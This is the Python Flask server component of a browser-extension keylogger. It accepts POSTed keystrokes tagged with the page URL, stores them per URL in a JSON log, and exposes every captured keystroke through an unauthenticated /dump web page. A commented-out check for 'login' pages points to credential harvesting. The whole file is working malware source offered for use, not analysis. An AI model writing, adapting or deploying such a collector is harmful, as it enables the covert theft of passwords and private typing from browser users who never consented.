""" Keylogger/server/server.py

    This is a Python Flask Server to capture the keystrokes
    and corresponding webpage from the keylogger extension.
"""
import json
from flask import Flask, request
from flask_cors import CORS

APP = Flask(__name__)
CORS(APP)

def check_log_exists_and_create_log():
    print("Checking")
    try:
        logfile = open("log.json")
    except FileNotFoundError:
        print("No log file, creating log")
        logfile = open("log.json", "w")
        empty_log = {}
        logfile.write(json.dumps(empty_log))
        logfile.close()

""" Destination route for logs from the extension. 
    Recieves a POST request with a body of:
    {
        page : URL String
        key  : Keypress string
    }
"""
@APP.route("/keylogger", methods=["POST"])
def recieve_log():
    request_body = request.get_json()
    url = request_body["page"]
    key = request_body["key"]

    check_log_exists_and_create_log()

    # if "login" in url:
    with open("log.json") as logfile:
        log = json.load(logfile)
        if url in log.keys():
            log[url] += key
        else:
            log[url] = key

    json_object = json.dumps(log, indent = 4)
    with open("log.json", "w") as logfile:
        logfile.write(json_object)
    return ""

"""
    Route to access the log remotely. 
    Recieves a GET request with the server returning the log.json file:
    {
        "URL" : "Keypresses"
        ...
    }
"""
@APP.route("/dump", methods=["GET"])
def dump_log():
    dump = """
    <html>
        <head>
            <title>Keylogger Dump</title>
        </head>
        <body>
    """
    with open("log.json") as logfile:
        log = json.load(logfile)
        for url in log.keys():
            dump += """
            <h1>{0}</h1>
            {1}
            """.format(url, log[url])
    dump += """
        </body>
    </html>
    """
    return dump

if __name__ == "__main__":
    APP.run(debug=False, port=5000)
